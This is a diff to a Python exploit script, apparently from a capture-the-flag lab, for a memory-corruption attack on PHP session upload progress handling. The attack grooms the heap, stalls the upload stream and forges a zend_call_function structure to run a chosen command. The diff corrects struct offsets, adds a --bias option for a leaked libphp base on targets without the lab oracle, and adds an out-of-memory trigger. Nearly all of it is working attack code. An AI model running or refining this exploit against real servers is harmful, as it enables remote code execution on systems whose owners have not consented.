@@ -66,8 +66,9 @@ ____/\_____/__|__    who earns FLAG{...}
 PROFILES = {
     "x86_64-php8x": {
         "arch": "x86_64", "fill": 5120, "n_groom": 149, "blob": 288,
-        "fci_size": 64, "off_fn": 8, "off_type": 16, "off_params": 48,
-        "off_internal_flag": 64, "off_handler": 64 + 88,
+        "fci_size": 64, "off_fn": 8, "off_type": 16, "off_params": 32,
+        "off_param_count": 48,
+        "off_internal_flag": 64, "off_handler": 64 + 72,
         "zend_internal": 1, "is_string": 0x106, "is_object": 0x308,
         "off_cmd": 200, "cmd_room": 80,
     },
@@ -143,7 +144,7 @@ def forge(prof: dict, call: int, cmd: bytes) -> bytes:
 
 
 def build_body(prof: dict, sid: str, cmd: bytes, call: int,
-               n_groom: int) -> tuple[bytes, bytes]:
+               n_groom: int, progress_value: bytes = b"x") -> tuple[bytes, bytes]:
     """(phase1, tail): phase1 ends mid-stream at the stall point."""
     fill = prof["fill"]
     blob = forge(prof, call, cmd)
@@ -157,7 +158,7 @@ def build_body(prof: dict, sid: str, cmd: bytes, call: int,
         return b"--" + BOUNDARY + b"\r\n" + disp + b"\r\n\r\n" + body
 
     pre = (part(b"PHPSESSID", sid.encode()) + b"\r\n"
-           + part(b"PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
+           + part(b"PHP_SESSION_UPLOAD_PROGRESS", progress_value) + b"\r\n"
            + part(b"f", b"", filename=b"a") + b"\r\n")
     phase1 = pre + b"A" * (fill + 64)
     tail = b"B" * (fill + 64) + b"\r\n"
@@ -238,11 +239,18 @@ def main() -> int:
     ap.add_argument("--profile", default="x86_64-php8x")
     ap.add_argument("--syms", required=False,
                     help='JSON {"zend_call_function": "0xOFF"} from nm of the target binary')
+    ap.add_argument("--bias", type=lambda x: int(x, 16), default=None,
+                    help="leaked libphp base (for targets without the "
+                         "lab oracle; leak-first applies - bias comes from "
+                         "an in-band leak or the assisted range helper)")
     ap.add_argument("--leak-url", default="", help="lab oracle URL (default: target)")
     ap.add_argument("--attempts", type=int, default=8)
     ap.add_argument("--stall", type=float, default=1.4)
     ap.add_argument("--jitter", type=int, default=6,
                     help="groom-count sweep +/- N across attempts")
+    ap.add_argument("--progress-len", type=int, default=0,
+                    help="PHP_SESSION_UPLOAD_PROGRESS value size (OOM trigger; "
+                         "e.g. 1048576 at 2M limit = vendor's FORMDATA-copy OOM)")
     ap.add_argument("--verify-url", default="", help="blind file-drop check URL")
     ap.add_argument("--out", default="", help="with --dry: write full body to file")
     ap.add_argument("--dry", action="store_true", help="build body only, never send")
@@ -274,12 +282,17 @@ def main() -> int:
 
     for n in range(1, a.attempts + 1):
         log("ATTEMPT", f"{n}/{a.attempts}", t0)
-        bias = leak_bias(a.leak_url or a.target.split("?")[0], t0)
+        if a.bias is not None:
+            bias = a.bias
+            log("LEAK", f"bias=0x{bias:x} (provided via --bias)", t0)
+        else:
+            bias = leak_bias(a.leak_url or a.target.split("?")[0], t0)
         call = resolve_call(a.syms, bias, t0)
         off = (n % (2 * a.jitter + 1)) - a.jitter if a.jitter else 0
         n_groom = max(1, prof["n_groom"] + off)
         sid = "%032x" % secrets.randbits(128)
-        phase1, tail = build_body(prof, sid, cmd, call, n_groom)
+        pv = (b"V" * a.progress_len) if a.progress_len else b"x"
+        phase1, tail = build_body(prof, sid, cmd, call, n_groom, progress_value=pv)
         log("STAGE", f"total={len(phase1) + len(tail)} n_groom={n_groom} "
                      f"call=0x{call:x}", t0)
         try:
